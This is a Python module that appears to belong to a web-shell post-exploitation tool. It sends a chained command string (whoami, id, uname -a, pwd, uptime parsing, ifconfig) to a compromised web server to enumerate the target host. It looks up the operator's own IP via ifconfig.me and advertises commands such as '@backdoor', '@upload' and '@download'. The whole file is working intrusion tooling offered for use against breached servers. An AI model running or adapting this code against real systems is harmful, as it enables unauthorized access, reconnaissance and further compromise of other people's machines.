import datetime
from urllib2 import urlopen, URLError

from core.libs.menu import getargs
from core.libs.request_handler import make_request
from core.libs.thirdparty.termcolor import colored


class TargetBox(object):
    def __init__(self, url=None):
        self.url = url
        self.cmd = 'whoami;'
        self.cmd += 'id;'
        self.cmd += 'uname -a;'
        self.cmd += 'pwd;'
        self.cmd += 'ls -ld `pwd` | awk \'{print $1}\';'
        self.cmd += 'bash -c "input=\$(uptime); if [[ \$input == *day* ]]; then out=\$(echo \$input | awk \'{print \$3\\" days\\"}\'); if [[ \$input == *min* ]]; then out=\$(echo \\"\$out and \\" && echo \$input | awk \'{print \$5\\" minutes\\"}\'); else out=\$(echo \\"\$out, \\" && echo \$input | awk \'{print \$5}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi elif [[ \$input == *min* ]]; then out=\$(echo \$input | awk \'{print \$3\\" minutes\\"}\'); else out=\$(echo \$input | awk \'{print \$3}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi; echo \$out;" ;'
        self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' ';"

        self.available_commands = ['@backdoor', '@download', '@enum', '@history', '@info', '@update', '@upload', 'clear', 'exit']

    def get_information(self):
        now = datetime.datetime.now()

        # Call get_page_source() method then assign it to self.source
        source = make_request.get_page_source(self.cmd)

        def get(seq, index, default='Unknown'):
            try:
                return seq[index]
            except:
                return default

        self.current_user = get(source, 0)
        self.current_id = get(source, 1)
        self.kernel_info = get(source, 2)
        self.cwd = get(source, 3)
        self.perm_cwd = get(source, 4)
        self.uptime = get(source, 5)
        self.host_ip = get(source, 6)
        self.session = now.strftime("%Y-%m-%d")
        self.url = '/'.join(getargs.url.split('/', 3)[:3])
        try:
            # Get the attacker's ip address (Thanks @mandreko)
            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            self.local_ip = 'Unknown'

        self.info = '\t' + '-' * int(len(self.kernel_info) + 16) + '\n'
        self.info += colored("\tUser         : ", 'red') + colored(self.current_user, 'green') + '\n'
        self.info += colored("\tID           : ", 'red') + colored(self.current_id, 'green') + '\n'
        self.info += colored("\tKernel       : ", 'red') + colored(self.kernel_info, 'green') + '\n'
        self.info += colored("\tCWD          : ", 'red') + colored(self.cwd, 'green') + colored('\t\t' + self.perm_cwd, 'grey', attrs=['bold']) + '\n'
        self.info += colored("\tUptime       : ", 'red') + colored(self.uptime, 'green') + '\n'
        self.info += colored("\tTarget's IPs : ", 'red') + colored(self.host_ip, 'green') + '\n'
        self.info += colored("\tOur IP       : ", 'red') + colored(self.local_ip, 'green') + '\n'
        self.info += '\t' + '-' * int(len(self.kernel_info) + 16)
        self.info += "\n\n"

        self.info += colored("\t[+] Available commands: " + ', '.join(self.available_commands), 'blue', attrs=['underline', 'bold']) + '\n'
        self.info += colored("\t[+] Inserting ! at the begining of the command will execute the command locally (on your box)", 'blue', attrs=['underline', 'bold'])
        self.info += "\n"
        return self.info

info = TargetBox()
